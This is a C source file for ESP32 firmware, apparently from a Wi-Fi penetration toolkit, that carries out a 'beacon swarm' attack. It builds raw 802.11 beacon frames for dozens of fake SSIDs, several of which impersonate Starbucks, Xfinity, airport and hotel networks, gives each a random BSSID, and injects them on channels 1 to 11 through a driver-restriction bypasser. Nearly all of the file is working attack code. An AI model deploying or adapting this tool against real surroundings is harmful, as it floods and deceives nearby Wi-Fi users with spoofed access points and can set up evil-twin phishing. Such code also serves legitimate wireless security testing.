#include "attack_beacon.h"
#include <string.h>
#include <stdlib.h>
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "esp_system.h"
#include "nvs.h"
#include "nvs_flash.h"
#include "wifi_controller.h"
#include "wsl_bypasser.h"

static const char *TAG = "attack_beacon";
static esp_timer_handle_t beacon_timer_handle = NULL;

#define MAX_SWARM_SIZE 32
#define MAX_SSID_LEN 33
#define NVS_NAMESPACE "swarm"
#define NVS_KEY_SSIDS "ssids"

static char dynamic_swarm_ssids[MAX_SWARM_SIZE][MAX_SSID_LEN];
static int dynamic_swarm_count = 0;

// Default SSIDs for the swarm
static const char *default_ssids[] = {
    "FREE WIFI",
    "STARBUCKS_FREE",
    "AIRPORT_GUEST",
    "XFINITY_WIFI",
    "ATT_WIFI",
    "GOOGLE_STATION",
    "NETGEAR",
    "LINKSYS",
    "TP-LINK_FREE",
    "HOTEL_GUEST",
    "GUEST_WIFI",
    "PUBLIC_WIFI",
    "MCDONALDS_FREE",
    "TRAIN_STATION_WIFI",
    "UNSECURED_NETWORK",
    "COFFEE_SHOP_GUEST"
};

#define DEFAULT_SWARM_SIZE (sizeof(default_ssids) / sizeof(default_ssids[0]))

/**
 * @brief Loads the swarm SSID list from Non-Volatile Storage (NVS).
 * 
 * If no SSIDs are found in NVS, it falls back to a default set of common public SSIDs.
 */
void attack_beacon_load_ssids() {
    nvs_handle_t nvs_handle;
    esp_err_t err = nvs_open(NVS_NAMESPACE, NVS_READONLY, &nvs_handle);
    
    if (err != ESP_OK) {
        ESP_LOGI(TAG, "No saved SSIDs found in NVS (err: %s), using defaults", esp_err_to_name(err));
        dynamic_swarm_count = DEFAULT_SWARM_SIZE;
        for (int i = 0; i < DEFAULT_SWARM_SIZE; i++) {
            strncpy(dynamic_swarm_ssids[i], default_ssids[i], MAX_SSID_LEN - 1);
            dynamic_swarm_ssids[i][MAX_SSID_LEN - 1] = '\0';
        }
        return;
    }

    size_t required_size;
    err = nvs_get_str(nvs_handle, NVS_KEY_SSIDS, NULL, &required_size);
    if (err == ESP_OK && required_size > 0) {
        char *buffer = malloc(required_size);
        if (buffer) {
            nvs_get_str(nvs_handle, NVS_KEY_SSIDS, buffer, &required_size);
            ESP_LOGI(TAG, "Loaded SSIDs string from NVS: %s", buffer);
            
            // Parse comma-separated SSIDs from the NVS string
            dynamic_swarm_count = 0;
            char *token = strtok(buffer, ",");
            while (token != NULL && dynamic_swarm_count < MAX_SWARM_SIZE) {
                strncpy(dynamic_swarm_ssids[dynamic_swarm_count], token, MAX_SSID_LEN - 1);
                dynamic_swarm_ssids[dynamic_swarm_count][MAX_SSID_LEN - 1] = '\0';
                dynamic_swarm_count++;
                token = strtok(NULL, ",");
            }
            free(buffer);
            ESP_LOGI(TAG, "Successfully loaded %d SSIDs into memory", dynamic_swarm_count);
        }
    } else {
        ESP_LOGI(TAG, "NVS key empty or error (err: %s), using defaults", esp_err_to_name(err));
        dynamic_swarm_count = DEFAULT_SWARM_SIZE;
        for (int i = 0; i < DEFAULT_SWARM_SIZE; i++) {
            strncpy(dynamic_swarm_ssids[i], default_ssids[i], MAX_SSID_LEN - 1);
            dynamic_swarm_ssids[i][MAX_SSID_LEN - 1] = '\0';
        }
    }
    nvs_close(nvs_handle);
}

/**
 * @brief Retrieves the current swarm SSIDs as a comma-separated string.
 * @param buffer Output buffer to store the string.
 * @param max_len Maximum length of the output buffer.
 */
void attack_beacon_get_ssids(char *buffer, size_t max_len) {
    if (buffer == NULL || max_len == 0) return;
    
    // Ensure SSIDs are loaded before retrieval
    if (dynamic_swarm_count == 0) attack_beacon_load_ssids();
    
    buffer[0] = '\0';
    for (int i = 0; i < dynamic_swarm_count; i++) {
        strncat(buffer, dynamic_swarm_ssids[i], max_len - strlen(buffer) - 1);
        if (i < dynamic_swarm_count - 1) {
            strncat(buffer, ",", max_len - strlen(buffer) - 1);
        }
    }
}

/**
 * @brief Updates the swarm SSID list and persists it to NVS.
 * @param comma_separated_ssids New list of SSIDs separated by commas.
 */
void attack_beacon_set_ssids(const char *comma_separated_ssids) {
    if (comma_separated_ssids == NULL) return;
    ESP_LOGI(TAG, "Updating Swarm SSIDs: %s", comma_separated_ssids);

    // Persist to NVS for longevity across reboots
    nvs_handle_t nvs_handle;
    esp_err_t err = nvs_open(NVS_NAMESPACE, NVS_READWRITE, &nvs_handle);
    if (err == ESP_OK) {
        nvs_set_str(nvs_handle, NVS_KEY_SSIDS, comma_separated_ssids);
        nvs_commit(nvs_handle);
        nvs_close(nvs_handle);
        ESP_LOGI(TAG, "Saved new swarm SSIDs to NVS");
    } else {
        ESP_LOGE(TAG, "Failed to open NVS for writing (err: %s)", esp_err_to_name(err));
    }

    // Reload the in-memory SSID array to reflect changes immediately
    attack_beacon_load_ssids();
}

// Beacon frame template
static uint8_t beacon_frame[] = {
    0x80, 0x00,                         // Frame Control: Beacon
    0x00, 0x00,                         // Duration
    0xff, 0xff, 0xff, 0xff, 0xff, 0xff, // Destination: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (BSSID) - To be filled
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID - To be filled
    0x00, 0x00,                         // Sequence Control
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Timestamp
    0x64, 0x00,                         // Beacon Interval: 100ms
    0x01, 0x04,                         // Capability Info
    // Fixed parameters end, tagged parameters start
    0x00, 0x00,                         // Tag 0: SSID (Length to be filled)
};

/**
 * @brief Internal callback for the beacon timer to generate and send raw beacon frames.
 * 
 * This function iterates through the swarm SSID list, generates a unique BSSID for each,
 * constructs a raw 802.11 beacon frame, and injects it into the air.
 * It also handles channel hopping across 1-11 for broader visibility.
 */
static void send_beacon_swarm(void *arg) {
    if (dynamic_swarm_count == 0) attack_beacon_load_ssids();

    uint8_t frame[256];
    uint8_t bssid[6];
    static uint8_t channel_to_flood = 1;
    static uint32_t bssid_seed = 0;
    static uint8_t channel_tick_count = 0;
    
    // Initialize a random seed for BSSID generation on the first run
    if (bssid_seed == 0) bssid_seed = esp_random();

    // Set hardware channel only when the tick resets to avoid unnecessary radio reconfiguration
    if (channel_tick_count == 0) {
        wifictl_set_channel(channel_to_flood);
    }
    
    for (int i = 0; i < dynamic_swarm_count; i++) {
        uint32_t r = bssid_seed + i;
        
        // Construct a unique MAC address for this SSID (00:0a:95 is a common vendor prefix)
        bssid[0] = 0x00;
        bssid[1] = 0x0a;
        bssid[2] = 0x95;
        bssid[3] = (uint8_t)((r >> 16) & 0xFF);
        bssid[4] = (uint8_t)((r >> 8) & 0xFF);
        bssid[5] = (uint8_t)(r & 0xFF);

        // Copy frame template and fill in source/BSSID addresses
        memcpy(frame, beacon_frame, sizeof(beacon_frame));
        memcpy(&frame[10], bssid, 6);
        memcpy(&frame[16], bssid, 6);
        
        const char *ssid = dynamic_swarm_ssids[i];
        uint8_t ssid_len = strlen(ssid);
        if (i == 0) {
            ESP_LOGI(TAG, "Broadcasting first SSID in swarm: %s (len: %d) on channel %d", ssid, ssid_len, channel_to_flood);
        }
        
        // Fill SSID tag (Tag 0)
        frame[37] = ssid_len;
        memcpy(&frame[38], ssid, ssid_len);
        
        // Add Supported Rates tag
        int pos = 38 + ssid_len;
        frame[pos++] = 0x01;
        frame[pos++] = 0x08;
        frame[pos++] = 0x82; frame[pos++] = 0x84; frame[pos++] = 0x8b; frame[pos++] = 0x96;
        frame[pos++] = 0x24; frame[pos++] = 0x30; frame[pos++] = 0x48; frame[pos++] = 0x6c;
        
        // Add DS Parameter set tag (Current Channel)
        frame[pos++] = 0x03;
        frame[pos++] = 0x01;
        frame[pos++] = channel_to_flood; 
        
        // Inject the frame into the air via the low-level bypasser
        wsl_bypasser_send_raw_frame(frame, pos);
        
        // Small delay to prevent radio buffer overflow while maintaining high injection rate
        esp_rom_delay_us(200);
    }
    
    // Logic for channel hopping (switch channel every 10 timer ticks)
    channel_tick_count++;
    if (channel_tick_count >= 10) {
        channel_tick_count = 0;
        channel_to_flood++;
        if (channel_to_flood > 11) channel_to_flood = 1;
    }
}

/**
 * @brief Starts the beacon swarm attack.
 * @param config Pointer to attack_config_t (unused for beacon attacks, uses swarm SSIDs).
 */
void attack_beacon_start(attack_config_t *config) {
    if (beacon_timer_handle != NULL) {
        attack_beacon_stop();
    }

    if (dynamic_swarm_count == 0) attack_beacon_load_ssids();

    ESP_LOGI(TAG, "Starting Beacon Swarm with %d SSIDs", dynamic_swarm_count);

    // To perform raw frame injection, we must activate an AP interface.
    // This SSID is hidden to minimize interference with the user's scan results.
    wifi_config_t ap_config = {
        .ap = {
            .ssid = "INTERNAL_BEACON",
            .ssid_len = 15,
            .authmode = WIFI_AUTH_OPEN,
            .max_connection = 1,
            .ssid_hidden = 1 
        },
    };
    wifictl_ap_start(&ap_config);

    // Create and start a periodic timer for beacon injection (100ms interval)
    const esp_timer_create_args_t beacon_timer_args = {
        .callback = &send_beacon_swarm,
        .name = "beacon_timer"
    };
    
    ESP_ERROR_CHECK(esp_timer_create(&beacon_timer_args, &beacon_timer_handle));
    ESP_ERROR_CHECK(esp_timer_start_periodic(beacon_timer_handle, 100000));
}

/**
 * @brief Stops the beacon swarm attack and cleans up resources.
 */
void attack_beacon_stop() {
    if (beacon_timer_handle != NULL) {
        ESP_LOGI(TAG, "Stopping Beacon Swarm");
        esp_timer_stop(beacon_timer_handle);
        esp_timer_delete(beacon_timer_handle);
        beacon_timer_handle = NULL;
        
        // Clean up the temporary AP interface and return to STA mode
        wifictl_ap_stop();
    }
}
